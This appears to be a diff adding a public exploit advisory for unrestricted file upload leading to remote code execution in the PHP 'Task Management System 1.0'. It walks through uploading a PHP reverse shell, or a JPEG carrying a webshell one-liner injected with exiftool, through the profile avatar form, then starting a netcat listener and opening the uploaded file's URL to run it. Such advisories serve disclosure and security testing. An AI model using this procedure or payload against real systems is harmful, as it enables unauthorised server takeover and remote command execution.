@@ -1,0 +1,23 @@
+# Exploit Title: Task Management System 1.0 - Unrestricted File Upload to Remote Code Execution
+# Exploit Author: Saeed Bala Ahmed (r0b0tG4nG)
+# Date: 2020-12-08
+# Google Dork: N/A
+# Vendor Homepage: https://www.sourcecodester.com/php/14615/task-management-system-using-phpmysqli-source-code.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14615&title=Task+Management+System+using+PHP%2FMySQLi+with+Source+Code
+# Affected Version: Version 1
+# Category: Web Application
+# Tested on: Parrot OS
+
+
+Step 1: Log in to the CMS with any valid user credentials.
+Step 2: Click on the logged in username on header and select Manage Account.
+Step 3: Upload a php payload ( i used the default php webshell in
+/usr/share/webshells/php/php-reverse-shell.php) or a jpeg image embeded
+with a php payload. ("exiftool -Comment='<?php system($_GET['cmd']); ?>'
+r0b0t.jpg") Then update profile.
+Step 4: Click on username on header again and select Manage Account.
+Step 5: Right click on the uploaded php payload or embeded image located
+under the "choose avatar form" then copy image location.
+Step 6: Start nc listener and paste the url in browser. This will trigger
+the remote code execution if you used a php shell.  (
+http://localhost/assets/uploads/1607438280_shell.php )
